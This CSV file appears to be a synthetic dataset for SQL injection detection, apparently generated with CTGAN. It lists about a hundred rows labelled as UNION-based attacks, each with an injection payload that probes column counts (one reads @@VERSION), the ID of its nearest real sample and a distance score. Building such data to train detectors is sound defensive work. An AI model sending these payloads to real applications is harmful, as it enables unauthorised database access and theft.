id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000398,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000152,4.470667372061476
CTGAN_000399,attack,union,"1""  )   as hymr where 5497  =  5497 union all select null,null,null,null--",nearest_attack_euclidean,R000633,5.028084436691806
CTGAN_000400,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000115,4.1993605175310424
CTGAN_000401,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000183,5.305015494172124
CTGAN_000402,attack,union," select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000040,5.482823493863055
CTGAN_000403,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000523,5.51283222361622
CTGAN_000404,attack,union,"-2167'   )    )     )   union all select 3804,3804,3804,3804,3804,3804#",nearest_attack_euclidean,R000292,5.970300036216486
CTGAN_000405,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000471,3.20228797872505
CTGAN_000406,attack,union,"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--",nearest_attack_euclidean,R000182,6.3977531580799205
CTGAN_000407,attack,union,"1""  )   as hymr where 5497  =  5497 union all select null,null,null,null--",nearest_attack_euclidean,R000633,4.591569789796034
CTGAN_000408,attack,union,"1   )    )    as mgvw where 4923  =  4923 union all select null,null,null,null--",nearest_attack_euclidean,R000351,4.84317916390747
CTGAN_000409,attack,union,"-1807'   )    )    union all select 9853,9853,9853,9853,9853,9853#",nearest_attack_euclidean,R000306,3.8820698331614696
CTGAN_000410,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000720,4.944331458317303
CTGAN_000411,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000378,7.545650728238868
CTGAN_000412,attack,union,"-3013'  )   where 2027  =  2027 union all select 2027,2027,2027,2027--",nearest_attack_euclidean,R000492,6.033192666295929
CTGAN_000413,attack,union,"-6292  )   union all select 7499,7499,7499,7499,7499,7499,7499--",nearest_attack_euclidean,R000173,4.526729977780089
CTGAN_000414,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000234,4.894120566476489
CTGAN_000415,attack,union,"-3013'  )   where 2027  =  2027 union all select 2027,2027,2027,2027--",nearest_attack_euclidean,R000492,5.326941436831761
CTGAN_000416,attack,union,"1'   )    )    as xuab where 4369  =  4369 union all select null,null,null--",nearest_attack_euclidean,R000584,5.616244235647538
CTGAN_000417,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000385,3.866773987308444
CTGAN_000418,attack,union,"1""  )   as xsgx where 5239  =  5239 union all select null,null--",nearest_attack_euclidean,R000473,5.954429256508534
CTGAN_000419,attack,union,"-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#",nearest_attack_euclidean,R000113,3.8581864472282983
CTGAN_000420,attack,union,"-3933'   )    )     )   union all select 6198,6198,6198,6198,6198#",nearest_attack_euclidean,R000128,4.822097884635613
CTGAN_000421,attack,union,"1'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000548,3.9863497954725706
CTGAN_000422,attack,union,"-1339   )    )     )   union all select 2938,2938,2938,2938,2938,2938#",nearest_attack_euclidean,R000134,5.540445326990333
CTGAN_000423,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R000537,3.8689345202944825
CTGAN_000424,attack,union,"-9175'   )    )    union all select 6174,6174,6174,6174--",nearest_attack_euclidean,R000776,5.9653378159587716
CTGAN_000425,attack,union,"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000243,4.2878170234038855
CTGAN_000426,attack,union,"1' where 8969  =  8969 union all select null,null,null,null,null--",nearest_attack_euclidean,R000602,5.129884775182911
CTGAN_000427,attack,union,"-3865'  )   union all select 4935,4935,4935,4935,4935--",nearest_attack_euclidean,R000359,5.980582330097173
CTGAN_000428,attack,union,"-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#",nearest_attack_euclidean,R000296,5.084938181315861
CTGAN_000429,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000330,5.989040708246706
CTGAN_000430,attack,union,"-4145%""   )    )    union all select 9404,9404,9404,9404,9404,9404,9404#",nearest_attack_euclidean,R000175,5.974839061305172
CTGAN_000431,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000546,5.256103855245516
CTGAN_000432,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000486,5.091548370858133
CTGAN_000433,attack,union,"1""  )   where 2758  =  2758 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000137,5.16885022371647
CTGAN_000434,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000685,4.407967957848277
CTGAN_000435,attack,union,"1'   )    )    as xuab where 4369  =  4369 union all select null,null,null--",nearest_attack_euclidean,R000584,5.15746921737
CTGAN_000436,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000368,5.604617695293946
CTGAN_000437,attack,union,"1%'  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000553,6.70316682856509
CTGAN_000438,attack,union,"1' where 1093  =  1093 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000527,5.573991992870578
CTGAN_000439,attack,union,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",nearest_attack_euclidean,R000231,5.2367264269072225
CTGAN_000440,attack,union,"-4535'  )   union all select 8491,8491,8491,8491,8491,8491--",nearest_attack_euclidean,R000184,3.9921033727460262
CTGAN_000441,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000752,5.113389655021364
CTGAN_000442,attack,union,"1' where 7445  =  7445 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000719,3.620742231109227
CTGAN_000443,attack,union,"-3209'+  (  select ldum where 9912  =  9912 union all select 9912,9912,9912,9912#",nearest_attack_euclidean,R000678,5.687364354597361
CTGAN_000444,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000675,5.019947310172582
CTGAN_000445,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000163,5.654847781607338
CTGAN_000446,attack,union,"-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#",nearest_attack_euclidean,R000718,5.897502593585012
CTGAN_000447,attack,union,"1""  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000252,5.545941991035177
CTGAN_000448,attack,union,"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",nearest_attack_euclidean,R000469,5.768518581319001
CTGAN_000449,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000435,4.273416989029453
CTGAN_000450,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000675,5.6608273100810775
CTGAN_000451,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R000537,5.36439688509812
CTGAN_000452,attack,union,"-8080""  )   as nlos where 8917  =  8917 union all select 8917,8917,8917,8917--",nearest_attack_euclidean,R000158,5.226678099845623
CTGAN_000453,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000379,4.504366198325851
CTGAN_000454,attack,union,"1'   )    )    as tgso where 1349  =  1349 union all select null,null,null,null--",nearest_attack_euclidean,R000594,5.021222289763395
CTGAN_000455,attack,union,"1""  )   where 2758  =  2758 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000137,5.956959618933825
CTGAN_000456,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000607,5.30312176481176
CTGAN_000457,attack,union,"1""  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000699,4.365359085329368
CTGAN_000458,attack,union,"1' in boolean mode  )   union all select null,null,null,null--",nearest_attack_euclidean,R000399,6.082574670184102
CTGAN_000459,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000664,4.130431129667587
CTGAN_000460,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000163,4.2892869361132515
CTGAN_000461,attack,union,"1'   )    )    as tgso where 1349  =  1349 union all select null,null,null,null--",nearest_attack_euclidean,R000594,4.971435859762075
CTGAN_000462,attack,union,"1' where 6905  =  6905 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000745,5.68793089414466
CTGAN_000463,attack,union,"-1164""  )   union all select 6617,6617,6617,6617,6617,6617--",nearest_attack_euclidean,R000298,4.617645919793158
CTGAN_000464,attack,union,"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--",nearest_attack_euclidean,R000182,5.287594076477831
CTGAN_000465,attack,union,"-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#",nearest_attack_euclidean,R000718,3.9622794189652923
CTGAN_000466,attack,union,"1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000530,5.572760189504278
CTGAN_000467,attack,union,"-1710""   )    )    as cvky where 1858  =  1858 union all select 1858,1858--",nearest_attack_euclidean,R000417,5.798775311636529
CTGAN_000468,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000124,5.696459667202346
CTGAN_000469,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000262,4.604850742069906
CTGAN_000470,attack,union,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",nearest_attack_euclidean,R000239,5.4622118031484925
CTGAN_000471,attack,union,"1'   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000301,4.537277419493851
CTGAN_000472,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000720,5.466629521591608
CTGAN_000473,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000181,5.137693168003187
CTGAN_000474,attack,union,"1 where 6412  =  6412 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000422,6.117328202307404
CTGAN_000475,attack,union,"1   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000244,3.997084161650039
CTGAN_000476,attack,union,"-9136%""  )   union all select 3081,3081,3081,3081,3081,3081,3081#",nearest_attack_euclidean,R000762,5.339369051622536
CTGAN_000477,attack,union,"1'  )   as yjdg where 5262  =  5262 union all select null,null,null#",nearest_attack_euclidean,R000549,5.348531316409056
CTGAN_000478,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R000687,4.581134642677305
CTGAN_000479,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000752,6.4383350208200465
CTGAN_000480,attack,union,"-6639'  )   as trll where 6271  =  6271 union all select 6271,6271,6271#",nearest_attack_euclidean,R000654,4.721503527852968
CTGAN_000481,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000675,4.84257505386122
CTGAN_000482,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000115,5.4487339300194515
CTGAN_000483,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000752,3.5961848045691704
CTGAN_000484,attack,union,"-1807'   )    )    union all select 9853,9853,9853,9853,9853,9853#",nearest_attack_euclidean,R000306,4.975168497820003
CTGAN_000485,attack,union,"1'   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000465,4.909501782142038
CTGAN_000486,attack,union,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",nearest_attack_euclidean,R000239,5.300448722052974
CTGAN_000487,attack,union,"1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000530,6.014550016243578
CTGAN_000488,attack,union,"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000169,3.3551947577270758
CTGAN_000489,attack,union,"-1802%'   )    )    union all select 1002,1002,1002,1002,1002,1002,1002#",nearest_attack_euclidean,R000681,4.842477206266212
CTGAN_000490,attack,union,"1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000530,4.618814485580164
CTGAN_000491,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000385,5.549119226123795
CTGAN_000492,attack,union,"1'+  (  select unzl where 3432  =  3432 union all select null,null,null,null--",nearest_attack_euclidean,R000177,4.828781244639864
CTGAN_000493,attack,union,"1'+  (  select gajr where 6653  =  6653 union all select null,null,null,null#",nearest_attack_euclidean,R000192,5.338545530328027
CTGAN_000494,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000685,6.221107450075883
CTGAN_000495,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000385,4.484088539504843
CTGAN_000496,attack,union,"1""  )   where 1700  =  1700 union all select null,null,null,null,null#",nearest_attack_euclidean,R000579,4.488620273465276
CTGAN_000497,attack,union,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",nearest_attack_euclidean,R000231,6.4037338964871555
CTGAN_000498,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000741,5.305119359007728
CTGAN_000499,attack,union,"-4756""   )    )    union all select 6846,6846,6846,6846,6846,6846,6846#",nearest_attack_euclidean,R000679,5.0685436371231765
CTGAN_000500,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000152,5.288703287487598
